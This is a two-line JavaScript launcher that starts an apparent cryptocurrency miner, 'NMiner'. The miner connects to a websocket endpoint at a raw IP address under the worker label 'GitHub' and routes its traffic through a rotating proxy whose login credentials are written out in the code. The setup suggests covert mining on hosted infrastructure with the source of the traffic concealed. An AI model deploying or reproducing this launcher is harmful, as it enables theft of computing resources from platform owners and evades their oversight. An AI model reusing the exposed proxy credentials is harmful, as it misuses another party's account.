const { NMiner } = require(".");
new NMiner("ws://13.202.111.19:443", "GitHub", { proxy: "http://yekkvkeb-rotate:t8099hhbpqw8@p.webshare.io:80" });
